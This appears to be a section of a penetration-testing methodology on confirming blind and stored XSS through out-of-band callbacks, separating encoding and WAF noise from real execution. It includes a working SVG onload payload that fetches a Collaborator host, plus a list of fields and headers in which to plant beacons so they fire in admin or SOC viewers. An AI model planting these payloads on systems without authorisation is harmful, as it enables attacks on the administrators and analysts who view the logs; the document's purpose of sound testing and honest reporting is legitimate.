## OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)

For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).

### What is NOT confirmation

- ASP.NET request validator rejected your `<` and returned a different status code → not XSS, that's WAF noise.
- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that's correct output encoding.
- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
- Your `<script>` tag appears in the response as `&lt;script&gt;` → not XSS, that's escaping.

### What IS confirmation

- A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.

### Where to plant blind-XSS beacons

Any field whose value might be viewed in an admin UI / log viewer / email / report later:
- Error messages (`?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>`)
- Auth-flow source params (`?Source=`, `?ReturnUrl=`)
- Login form username field (admin may view audit logs of failed logins)
- User-Agent header (some SOC consoles render UA as HTML)
- Referer header (some analytics dashboards render Referer as HTML)
- Email addresses on registration / contact forms
- File-upload filenames

**Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.

**Lesson from a authorized engagement:** 10 blind-XSS Collaborator beacons planted across `ErrorMessage`, `Source`, the Authentication.asmx username field, User-Agent header, Referer header, and request paths. Zero callbacks over a 10-minute polling window. Conclusion: the SharePoint SOC views logs / errors in tooling that does not render HTML, AND the ASP.NET request validator blocks `<` in query strings before the payload reaches storage. Stored-XSS claim correctly retracted.
